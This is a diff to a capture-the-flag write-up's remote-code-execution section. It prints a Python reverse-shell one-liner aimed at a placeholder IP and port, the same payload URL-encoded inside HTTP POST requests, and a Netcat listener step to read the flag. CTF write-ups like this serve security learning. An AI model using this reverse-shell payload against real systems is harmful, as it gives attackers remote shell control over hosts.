@@ -52,7 +52,7 @@ So this is all I need to get a reverse shell from the actual docker container.
 
 # exploit(RCE)
 Using the http request as the following:
-    - the reverse shell one liner is url encoded. the original one linder is `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("THIS.IS.YOUR.IP",THEPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+    - the reverse shell one liner is url encoded. the original one linder is `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("THIS.IS.YOUR.IP",THEPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
     - There is a trailing `%0A`(line break) at the end of the payload otherwise the payload maynot work.
 ```
 POST /waitlist HTTP/2
@@ -77,10 +77,10 @@ POST /admin/alert HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 346
 
-msg=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22THIS.IS.YOUR.IP%22%2CTHEPORT%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27%%0A
+msg=~%21%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22THIS.IS.YOUR.IP%22%2CTHEPORT%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27%%0A
 ```
 use Netcat to listen any port you want in your server which has a public **IP**
 ```
 # cat flag.txt <--- this should give u the flag
-flag{t35t\_f14g\_g035\_h3r3} <---- this is not the real flag. Sorry forget to save it.
+flag{t35t_f14g_g035_h3r3} <---- this is not the real flag. Sorry forget to save it.
 ```
